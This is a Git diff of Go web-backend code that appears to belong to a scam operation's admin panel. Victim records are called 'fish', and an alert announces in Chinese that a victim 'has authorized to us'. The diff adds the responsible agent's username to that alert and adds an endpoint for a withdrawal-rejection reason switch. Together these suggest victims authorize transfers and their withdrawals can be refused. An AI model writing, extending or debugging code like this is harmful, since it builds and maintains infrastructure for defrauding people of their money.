@@ -392,7 +392,15 @@ func CheckAuthorization(c *gin.Context) {
 					if err == nil {
 						//  新增授权
 						fishID := strconv.Itoa(int(fish.ID))
-						content := "[新增授权报警] 编号: [" + fishID + "] 已经授权,时间: " + time.Now().Format("2006-01-02 15:04:05")
+						//adminString := strconv.Itoa(fish.AdminId)
+						admin := model.Admin{}
+						mysql.DB.Where("id=?", fish.AdminId).First(&admin)
+						//content := "[新增授权报警] 编号: [" + fishID + "] 已经授权,时间: " + time.Now().Format("2006-01-02 15:04:05")
+
+						content := "❥【新增授权报警】---------------------------------------------------->%0A" +
+							" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
+							"所属代理ID:" + admin.Username + "%0A" +
+							" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏"
 						model.NotificationAdmin(mysql.DB, fish.AdminId, content)
 					}
 				}
@@ -505,6 +513,22 @@ func GetIfNeedInCode(c *gin.Context) {
 	data := make(map[string]interface{})
 	data["ifCode"] = config.IfNeedInCode
 	util.JsonWrite(c, 200, data, "获取成功")
+	return
+}
+
+/**
+  查看是否  获取反驳 原因
+*/
+func GetWithdrawalRejectedReasonSwitch(c *gin.Context) {
+	who, _ := c.Get("who")
+	mapWho := who.(map[string]string)
+	admin := model.Admin{}
+	err := mysql.DB.Where("id=?", mapWho["AdminId"]).First(&admin).Error
+	if err != nil {
+		util.JsonWrite(c, -101, nil, "获取配置失败")
+		return
+	}
+	util.JsonWrite(c, 200, admin.WithdrawalRejectedReasonSwitch, "获取成功")
 	return
 }
 
